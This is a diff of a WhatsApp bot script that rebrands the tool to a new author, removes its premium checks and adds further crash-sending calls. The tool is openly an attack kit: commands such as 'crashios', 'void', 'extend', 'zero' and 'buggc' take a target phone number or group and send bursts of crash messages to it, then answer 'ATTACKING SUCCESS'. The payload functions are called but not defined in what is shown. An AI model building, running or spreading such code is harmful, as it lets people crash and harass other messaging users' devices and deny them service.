-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗦𝗾𝗹 𝗫 𝗣𝗮𝘆`,
@@ -7776,7 +10452,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"Suxoinfinity ${incTarget}\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Suxoinfinity ${incTarget}\"}`
 										}, ],
 									})
 								})
@@ -7792,15 +10468,14 @@ break
 			}
 			break
 			case 'crashios': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Crashios Number_\n_Example : Crashios 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Crashios Number_\n_Example : Crashios 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Crashios Number_\n_Example : Crashios 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Crashios Number_\n_Example : Crashios 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7825,7 +10500,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7836,7 +10511,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗿𝗮𝘀𝗵 𝗜𝗼𝗦`,
@@ -7853,7 +10528,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -7869,15 +10544,14 @@ break
 			}
 			break
 			case 'trashios': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Trashios Number_\n_Example : Trashios 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Trashios Number_\n_Example : Trashios 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Trashios Number_\n_Example : Trashios 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Trashios Number_\n_Example : Trashios 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7903,7 +10577,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7914,7 +10588,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗧𝗿𝗮𝘀𝗵 𝗜𝗼𝗦`,
@@ -7931,7 +10605,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -7947,15 +10621,14 @@ break
 			}
 			break
 			case 'void': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7963,7 +10636,7 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await TxIos(X, Ptcp = true)
+						await TxIos(X, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -7979,7 +10652,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7990,7 +10663,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗩𝗼𝗶𝗱𝗙𝗹𝘂𝘅 𝗜𝗼𝗦`,
@@ -8007,7 +10680,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"Infinitevoid ${incTarget}\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Infinitevoid ${incTarget}\"}`
 										}, ],
 									})
 								})
@@ -8023,15 +10696,14 @@ break
 			}
 			break
 			case 'extend': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ExTend Number_\n_Example : ExTend 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ExTend Number_\n_Example : ExTend 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ExTend Number_\n_Example : ExTend 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ExTend Number_\n_Example : ExTend 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -8039,13 +10711,13 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await TxOs(X, Ptcp = true)
+						await TxOs(X, Ptcp = false)
 					}
 					for (let i = 0; i < 2; i++) {
-						await StuckNull(X, GetsuZo, Ptcp = true)
+						await StuckNull(X, GetsuZo, Ptcp = false)
 					}
 					for (let i = 0; i < 7; i++) {
-						await TxOs(X, Ptcp = true)
+						await TxOs(X, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -8061,7 +10733,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -8072,7 +10744,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗘𝘅𝗧𝗲𝗻𝗱 𝗠𝗦𝗚`,
@@ -8089,7 +10761,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
 										}, ],
 									})
 								})
@@ -8105,15 +10777,14 @@ break
 			}
 			break
 			case 'zero': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use :  Number_\n_Example : Zero 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Zero Number_\n_Example : Zero 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Zero Number_\n_Example : Zero 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Zero Number_\n_Example : Zero 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -8121,7 +10792,14 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
+						console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"))
+						console.log(chalk.red("InVisible⚡"))
+						await sendCrashV2(X)
+						console.log(chalk.red("InVisible⚡"))
 						await sendCrash(X)
+						console.log(chalk.red("InVisible⚡"))
+						await sleep(3000)
+						await sendCrashV3(X)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -8137,7 +10815,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -8148,10 +10826,10 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
-										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗜𝗻𝗩𝗶𝘀𝗶𝗯𝗹𝗲 𝐀𝐩𝐢`,
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗜𝗻𝗩𝗶𝘀𝗶𝗯𝗹𝗲 𝗔𝗣𝗜`,
 										subtitle: "",
 										hasMediaAttachment: true,
 										...(await prepareWAMessageMedia({
@@ -8165,7 +10843,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
 										}, ],
 									})
 								})
@@ -8181,15 +10859,14 @@ break
 			}
 			break
 			case 'infinitevoid': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -8197,7 +10874,7 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 20; i++) {
-						await TxOs(X, Ptcp = true)
+						await TxOs(X, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -8213,7 +10890,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -8224,7 +10901,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗩𝗼𝗶𝗱𝗙𝗹𝘂𝘅 𝗜𝗻𝗙𝗶𝗻𝗶𝘁𝗲`,
@@ -8241,7 +10918,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -8258,8 +10935,7 @@ break
 			break
 			case "vpay": {
 				if (!isPremium) return zreply(mess.premium)
-				if (!isPremium) return zreply(mess.premium)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Vpay Number_\n_Example : Vpay 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Vpay Number_\n_Example : Vpay 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				const sections = []
 				const listgroup = await VxoZap.getAllGroups(true)
 				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
@@ -8731,7 +11407,7 @@ break
 					VxoZap.sendButtons(m.chat, {
 						"body": "LIST GROUP",
 						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						sections
 					}, {
 						quoted: Zets
@@ -8742,7 +11418,6 @@ break
 			}
 			break
 			case "buggc": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isPremium) return zreply(mess.premium)
 				const sections = []
 				const listgroup = await VxoZap.getAllGroups(true)
@@ -8789,7 +11464,7 @@ break
 					VxoZap.sendButtons(m.chat, {
 						"body": "LIST GROUP",
 						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
-						"footer": "⿻ ⌜ 𝐉𝐀𝐂𝐊𝐕𝟐 ⌟ ⿻",
+						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
 						sections
 					}, {
 						quoted: Zets
@@ -8800,7 +11475,6 @@ break
 			}
 			break
 			case "bugzet": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isPremium) return zreply(mess.premium)
 				const sections = []
 				const listgroup = await VxoZap.getAllGroups(true)
@@ -8847,7 +11521,7 @@ break
 					VxoZap.sendButtons(m.chat, {
 						"body": "LIST GROUP",
 						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
-						"footer": "⿻ ⌜ 𝐉𝐀𝐂𝐊𝐕𝟐 ⌟ ⿻",
+						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
 						sections
 					}, {
 						quoted: Zets
@@ -8858,7 +11532,6 @@ break
 			}
 			break
 			case "bugzap": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isPremium) return zreply(mess.premium)
 				const sections = []
 				const listgroup = await VxoZap.getAllGroups(true)
@@ -8909,7 +11582,7 @@ break
 					VxoZap.sendButtons(m.chat, {
 						"body": "LIST GROUP",
 						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
-						"footer": "⿻ ⌜ 𝐉𝐀𝐂𝐊𝐕𝟐 ⌟ ⿻",
+						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
 						sections
 					}, {
 						quoted: Zets
@@ -8920,7 +11593,6 @@ break
 			}
 			break
 			case "bugcflow": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isPremium) return zreply(mess.premium)
 				const sections = []
 				const listgroup = await VxoZap.getAllGroups(true)
@@ -8975,7 +11647,7 @@ break
 					VxoZap.sendButtons(m.chat, {
 						"body": "LIST GROUP",
 						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
-						"footer": "⿻ ⌜ 𝐉𝐀𝐂𝐊𝐕𝟐 ⌟ ⿻",
+						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
 						sections
 					}, {
 						quoted: Zets
@@ -8986,7 +11658,6 @@ break
 			}
 			break
 			case "bugoflow": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isPremium) return zreply(mess.premium)
 				const sections = []
 				const listgroup = await VxoZap.getAllGroups(true)
@@ -9031,7 +11702,7 @@ break
 					VxoZap.sendButtons(m.chat, {
 						"body": "LIST GROUP",
 						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
-						"footer": "⿻ ⌜ 𝐉𝐀𝐂𝐊𝐕𝟐 ⌟ ⿻",
+						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
 						sections
 					}, {
 						quoted: Zets
@@ -9042,7 +11713,6 @@ break
 			}
 			break
 			case "gcui": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isPremium) return zreply(mess.premium)
 				const sections = []
 				const listgroup = await VxoZap.getAllGroups(true)
@@ -9087,7 +11757,7 @@ break
 					VxoZap.sendButtons(m.chat, {
 						"body": "LIST GROUP",
 						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
